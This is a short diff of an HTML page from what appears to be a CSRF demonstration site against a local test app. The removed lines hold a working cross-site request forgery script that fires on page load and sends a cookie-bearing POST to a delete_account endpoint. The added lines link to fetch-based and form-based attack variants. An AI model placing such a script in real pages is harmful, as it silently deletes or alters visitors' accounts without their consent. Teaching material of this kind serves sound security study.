@@ -6,19 +6,10 @@
 <body>
     <h1>Cat-site Request Forgery</h1>
     <img src="https://http.cat/images/200.jpg" alt="Cat">
-    <!-- CSRF attack using fetch -->
-    <script>
-        // Automatically send the CSRF request when the page loads
-        window.onload = function() {
-            fetch('http://localhost:5000/delete_account', {
-                method: 'POST',
-                credentials: 'include'  // Include cookies
-            }).then(response => {
-                console.log('CSRF request sent');
-            }).catch(error => {
-                console.error('Error:', error);
-            });
-        };
-    </script>
+    <p>Select a CSRF delivery method:</p>
+    <ul>
+        <li><a href="/fetch-attack">Fetch API auto request</a></li>
+        <li><a href="/form-attack">Auto-submitting form</a></li>
+    </ul>
 </body>
 </html>
